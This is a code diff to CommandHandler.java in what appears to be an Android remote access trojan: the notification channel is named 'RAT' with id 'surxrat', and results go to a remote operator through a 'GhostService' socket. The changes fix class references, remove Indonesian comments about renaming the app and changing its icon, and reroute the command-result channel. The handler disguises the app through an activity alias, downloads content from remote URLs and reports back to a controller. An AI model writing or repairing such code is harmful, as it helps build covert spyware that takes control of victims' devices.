@@ -148,13 +148,13 @@ public class CommandHandler {
     }
 
     private void pushNotification(Context ctx, String title, String text) {
-        NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
+        android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
         String channelId = "surxrat";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "RAT", NotificationManager.IMPORTANCE_HIGH);
+            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, "RAT", android.app.NotificationManager.IMPORTANCE_HIGH);
             nm.createNotificationChannel(channel);
         }
-        Notification notif = new Notification.Builder(ctx, channelId)
+        android.app.Notification notif = new android.app.Notification.Builder(ctx, channelId)
                 .setContentTitle(title)
                 .setContentText(text)
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
@@ -205,12 +205,6 @@ public class CommandHandler {
             PackageManager pm = ctx.getPackageManager();
             ComponentName alias = new ComponentName(ctx, ctx.getPackageName() + ".MainActivityAlias");
             pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
-            // Ubah label aplikasi (hanya berlaku setelah restart atau jika ada activity yang menggunakan label)
-            // Untuk perubahan instan, kita bisa set label aplikasi dengan pm.setApplicationEnabledSetting? Tidak langsung bisa.
-            // Alternatif: update notification label? Biasanya perlu root atau rebuild.
-            // Di sini kita update label activity alias yang aktif.
-            // (Ini hanya contoh, fitur rename terbatas)
-            // Kirim pesan bahwa rename butuh restart
             sendData(ctx, "rename_result", "{\"status\":\"butuh restart\"}");
         } catch (Exception e) {
             sendData(ctx, "rename_result", "{\"error\":\"" + e.getMessage() + "\"}");
@@ -222,8 +216,6 @@ public class CommandHandler {
             try {
                 InputStream is = new URL(url).openStream();
                 Bitmap bmp = BitmapFactory.decodeStream(is);
-                // Simpan ke internal storage dan set sebagai ikon? Butuh root biasanya.
-                // Untuk contoh, kita bisa update shortcut atau tidak bisa.
                 sendData(ctx, "icon_result", "{\"status\":\"ikon diunduh, tapi perlu restart\"}");
             } catch (Exception e) {
                 sendData(ctx, "icon_result", "{\"error\":\"" + e.getMessage() + "\"}");
@@ -246,6 +238,9 @@ public class CommandHandler {
     }
 
     private void sendData(Context ctx, String type, String data) {
-        if (ctx.getSocket() != null) ctx.getSocket().send(type, data);
+        GhostService svc = GhostService.getInstance();
+        if (svc != null && svc.getSocket() != null) {
+            svc.getSocket().send(type, data);
+        }
     }
 }
